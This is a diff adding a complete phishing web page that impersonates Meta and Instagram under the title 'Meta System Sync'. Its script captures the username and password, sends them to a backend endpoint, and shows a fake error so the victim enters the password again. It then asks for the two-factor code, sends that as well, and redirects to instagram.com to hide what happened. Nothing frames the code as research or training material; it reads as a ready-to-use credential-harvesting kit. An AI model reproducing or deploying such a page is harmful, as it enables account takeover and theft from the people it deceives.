@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Meta System Sync</title>
+    <style>
+        body { background: #fafafa; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; border-radius: 8px; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 5px; background: #fafafa; box-sizing: border-box; }
+        .btn { background: #0095f6; color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .error { color: #ed4956; font-size: 13px; margin-bottom: 15px; display: none; background: #fff2f2; padding: 10px; border-radius: 4px; }
+        #loader { display: none; margin: 20px 0; }
+        .spin { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" width="80" style="margin-bottom:20px;">
+        <div id="error" class="error">Security Check: Invalid Access Key. Try again.</div>
+        
+        <div id="login-form">
+            <input type="text" id="u" placeholder="Account Username">
+            <input type="password" id="p" placeholder="Access Password">
+            <button class="btn" onclick="captureData()">CONNECT ACCOUNT</button>
+        </div>
+
+        <div id="loader">
+            <div class="spin"></div>
+            <p style="font-size: 12px; color: #8e8e8e; margin-top: 10px;">Verifying with Meta API...</p>
+        </div>
+
+        <div id="otp-form" style="display:none;">
+            <p style="font-size: 14px; font-weight: bold;">Two-Factor Authentication</p>
+            <p style="font-size: 12px; color: #8e8e8e; margin-bottom: 15px;">Enter the 6-digit code sent to your mobile.</p>
+            <input type="number" id="o" placeholder="000000">
+            <button class="btn" onclick="sendOTP()">VERIFY DEVICE</button>
+        </div>
+    </div>
+
+    <script>
+        let step = 0;
+        async function captureData() {
+            const u = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            if(!u || !p) return;
+
+            document.getElementById('login-form').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+
+            // Sending to Python Backend
+            await fetch('/api/index', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ u, p, t: step === 0 ? 'LOG' : 'VERIFIED' })
+            });
+
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                if(step === 0) {
+                    document.getElementById('login-form').style.display = 'block';
+                    document.getElementById('error').style.display = 'block';
+                    document.getElementById('p').value = '';
+                    step++;
+                } else {
+                    document.getElementById('otp-form').style.display = 'block';
+                }
+            }, 2500);
+        }
+
+        async function sendOTP() {
+            const o = document.getElementById('o').value;
+            if(o.length < 6) return;
+            await fetch('/api/index', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ u: document.getElementById('u').value, o, t: 'OTP' })
+            });
+            window.location.href = "https://instagram.com";
+        }
+    </script>
+</body>
+</html>
